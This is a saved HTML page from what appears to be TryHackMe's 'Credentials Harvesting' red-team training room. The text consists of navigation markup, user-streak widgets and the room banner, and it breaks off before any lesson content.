<a class="dropdown-item hidden-originally" href="https://tryhackme.com/resources" data-pf_style_display="none" data-pf_style_visibility="hidden">Resources</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/subscriptions" data-pf_style_display="none" data-pf_style_visibility="hidden">Buy Vouchers</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/develop-rooms" data-pf_style_display="none" data-pf_style_visibility="hidden">Develop Rooms</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/business" data-pf_style_display="none" data-pf_style_visibility="hidden">For Business</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/classrooms" data-pf_style_display="none" data-pf_style_visibility="hidden">For Education</a>
<a class="dropdown-item hidden-originally" target="_blank" href="https://store.tryhackme.com/" data-pf_style_display="none" data-pf_style_visibility="hidden">Swag Shop</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/glossary" data-pf_style_display="none" data-pf_style_visibility="hidden">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div id="thm-connection-status-dot" class="dot-small" data-pf_style_display="block" data-pf_style_visibility="visible"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white" data-pf_style_display="block" data-pf_style_visibility="visible">Access Machines</span>
</div>
</li>
<li class="nav-item" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<div class="nav-item-streak" data-pf_style_display="block" data-pf_style_visibility="visible">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="" data-pf_style_display="inline" data-pf_style_visibility="visible">
<span id="user-streak" data-streak="7" class="hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">7 <i class="fas fa-fire-alt" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
</span>
<script data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 17:19:58 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/credharvesting#" id="notification-btn" role="button" data-toggle="dropdown" data-pf_style_display="flex" data-pf_style_visibility="visible">
<i id="notification-icon" class="fal fa-bell" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
<div id="notification-dot" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">
<div id="notification-header" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Notifications</div>
<div id="nav-notifications" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="text-center mt-2 mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown" data-pf_style_display="list-item" data-pf_style_visibility="visible">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/credharvesting#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-pf_style_display="block" data-pf_style_visibility="visible">
<img src="./TryHackMe _ Credentials Harvesting_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="56" data-pf_rect_height="56">
</a>
<div class="dropdown-menu dropdown-menu-right hidden-originally" aria-labelledby="navbarAvatarDropdown" data-pf_style_display="none" data-pf_style_visibility="visible">
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/profile" data-pf_style_display="none" data-pf_style_visibility="hidden">Profile</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/referrals" data-pf_style_display="none" data-pf_style_visibility="hidden">Refer a friend</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/badges" data-pf_style_display="none" data-pf_style_visibility="hidden">Badges</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/rooms" data-pf_style_display="none" data-pf_style_visibility="hidden">My Rooms</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden">Access</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/feedback" data-pf_style_display="none" data-pf_style_visibility="hidden">Give Feedback</a>
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/logout" data-pf_style_display="none" data-pf_style_visibility="hidden">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Credentials Harvesting_files/streak-freeze.css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<div class="modal fade modal-streak-freeze hidden-originally" id="unlocked-streak-freeze" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="close close-streak hidden-originally" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<figure data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<img class="img-streak hidden-originally" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Credentials Harvesting_files/streak-freeze.svg" data-pf_style_display="none" data-pf_style_visibility="hidden">
</figure>
<h2 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">You've unlocked a streak freeze!</h2>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Credentials Harvesting_files/streak-freeze.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav hidden-originally" aria-label="Mobile secondary navigation menu." data-pf_style_display="none" data-pf_style_visibility="visible">
<header data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<a href="https://tryhackme.com/" aria-label="Go to the home page" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<img width="140" src="./TryHackMe _ Credentials Harvesting_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<i class="fal fa-times hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" href="https://tryhackme.com/dashboard" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="nav-title-icon far fa-browser hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div class="nav-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Dashboard</div>
</a>
</li>
<li class="nav-item active hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" href="https://tryhackme.com/hacktivities" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="nav-title-icon far fa-book-open hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div class="nav-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Learn</div>
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="nav-title-icon far fa-trophy hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div class="nav-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Compete</div>
<i class="far fa-angle-down hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a href="https://tryhackme.com/leaderboards" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<i class="fas fa-trophy hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Leaderboards</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<i class="fas fa-crown hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">King of the Hill</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<i class="fas fa-user-friends hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Workspace</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="nav-title-icon far fa-ellipsis-h-alt hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div class="nav-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Other</div>
<i class="far fa-angle-down hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a href="https://tryhackme.com/resources" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Resources</a>
<a href="https://tryhackme.com/subscriptions" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Develop Rooms</a>
<a href="https://tryhackme.com/business" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">For Business</a>
<a href="https://tryhackme.com/classrooms" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="nav-item-streak hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span id="mobile-streak-popover" class="size-24 hidden-originally" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span id="mobile-user-streak" data-streak="7" class="hacker-green hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">7 <i class="fas fa-fire-alt hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link size-22 d-inline-block hidden-originally" href="https://tryhackme.com/room/credharvesting#" id="mobile-notification-btn" role="button" data-toggle="dropdown" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i id="mobile-notification-icon" class="fal fa-bell hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div id="mobile-notification-dot" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="mobile-notification-header" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Notifications</div>
<div id="mobile-nav-notifications" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="text-center mt-2 mb-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<img src="./TryHackMe _ Credentials Harvesting_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a href="https://tryhackme.com/profile" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Profile</a>
<a href="https://tryhackme.com/referrals" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Refer a friend</a>
<a href="https://tryhackme.com/badges" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Badges</a>
<a href="https://tryhackme.com/rooms" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">My Rooms</a>
 <a href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Access</a>
<a href="https://tryhackme.com/feedback" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Give Feedback</a>
<a href="https://tryhackme.com/logout" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Credentials Harvesting_files/mobile-nav.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Credentials Harvesting_files/notifications.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<script src="./TryHackMe _ Credentials Harvesting_files/streak-freeze(1).js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<div id="wrapper" data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-banner" class="shadow-light" data-pf_style_display="block" data-pf_style_visibility="visible">
<img id="room-image-large" src="./TryHackMe _ Credentials Harvesting_files/attacking-ad.png" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="1912" data-pf_rect_height="230" class="pf-large-image">
<div data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-details" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="container" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="page-header" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="room-header" data-pf_style_display="grid" data-pf_style_visibility="visible">
<div id="room-voting" class="text-center vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div class="voting-buttons" data-pf_style_display="block" data-pf_style_visibility="visible">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i>
<div class="display-block" id="vote-number" data-pf_style_display="block" data-pf_style_visibility="visible">225</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div id="logo" data-pf_style_display="block" data-pf_style_visibility="visible"><img class="room-avatar" src="./TryHackMe _ Credentials Harvesting_files/1ab32f03262d2277c032ea836ef83bed.png" onerror="replaceImg(this)" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="90" data-pf_rect_height="90"></div>
</div>
<div class="vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
<div id="room-basic-data" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="d-flex justify-content-between" data-pf_style_display="flex" data-pf_style_visibility="visible">
<h1 id="title" class="bold-head" data-pf_style_display="block" data-pf_style_visibility="visible">Credentials Harvesting</h1>
<div id="room-title-options" data-pf_style_display="block" data-pf_style_visibility="visible">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;" data-pf_style_display="inline-flex" data-pf_style_visibility="visible">
<button id="browser-machine-start" type="button" class="btn btn-secondary" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="far fa-laptop" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group" data-pf_style_display="flex" data-pf_style_visibility="visible">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-pf_style_display="block" data-pf_style_visibility="visible"></button>
<div class="dropdown-menu hidden-originally" aria-labelledby="btnGroupDrop1" data-pf_style_display="none" data-pf_style_visibility="visible">
<a class="dropdown-item preventDefault hidden-originally" href="https://tryhackme.com/room/credharvesting#" onclick="changeMyMachine(&quot;kali-linux&quot;)" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use Kali Linux</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault hidden-originally" href="https://tryhackme.com/room/credharvesting#" onclick="changeMyMachine(&quot;attackbox&quot;)" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span class="mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use AttackBox</span>
<div class="text-lgray size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible"><i class="far fa-clouds mr-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()" data-pf_style_display="inline-flex" data-pf_style_visibility="visible">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;" data-pf_style_display="inline-block" data-pf_style_visibility="visible">
<span class="badge badge-secondary" data-toggle="dropdown" data-pf_style_display="flex" data-pf_style_visibility="visible">
<i class="fas fa-cog" data-pf_style_display="block" data-pf_style_visibility="visible"></i>
</span>
<div class="dropdown-menu hidden-originally" data-pf_style_display="none" data-pf_style_visibility="visible">
<a class="dropdown-item hidden-originally" href="https://tryhackme.com/api/room/manage/clone/credharvesting" id="clone-room" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="far fa-clone faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Clone Room</a>
<a class="dropdown-item preventDefault hidden-originally" id="writeups-simple" style="display: inline-block;" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-pen-alt faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Writeups</a>
<a class="dropdown-item preventDefault hidden-originally" data-toggle="modal" data-target="#resetUserProgressModal" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-eraser faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Reset Progress</a>
<a class="dropdown-item preventDefault hidden-originally" id="leave-room" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-sign-out-alt faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark " data-pf_style_display="inline-block" data-pf_style_visibility="visible">
<img class="bookmark" src="./TryHackMe _ Credentials Harvesting_files/bookmark.svg" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="16" data-pf_rect_height="20">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="" data-pf_style_display="block" data-pf_style_visibility="visible">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description" data-pf_style_display="block" data-pf_style_visibility="visible">Apply current authentication models employed in modern environments to a red team approach.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats" data-pf_style_display="block" data-pf_style_visibility="visible">
<div class="creators" data-pf_style_display="block" data-pf_style_visibility="visible"></div>
<div class="numbers" data-pf_style_display="block" data-pf_style_visibility="visible"></div>
</div>
</div>
</div>
<div class="container main pb" data-pf_style_display="block" data-pf_style_visibility="visible">
<div id="room-message" data-pf_style_display="block" data-pf_style_visibility="visible"></div>
<section id="sponsor" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<i id="sponsor-close" class="fas fa-times hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
<div id="sponsor-data" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</section>
<div id="top-panel" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<ul class="nav nav-tabs hidden-originally" id="task-navs" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link active hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/credharvesting#chart" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-chart-line icon-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Chart
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/credharvesting#scoreboard" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-trophy icon-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Scoreboard
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/credharvesting#chat" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-comments-alt icon-right chat-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Discuss
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/credharvesting#writeups" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-pen-alt icon-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Writeups
</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/credharvesting#about" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fas fa-info-circle icon-right hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con hidden-originally" id="room-main" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="card-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span id="room-tabs" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="tab-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="chart" class="tab-pane active hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span id="difficulty-bar" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
    <span class="room-difficulty diff-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
      Difficulty: 
        <span class="difficulty-medium hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Medium</span>
    </span></span>
<br data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><div id="chart-data" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</div>
<div id="scoreboard" class="tab-pane fade hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0 hidden-originally" id="scoreboard_table" data-pf_style_display="none" data-pf_style_visibility="hidden">
<thead data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
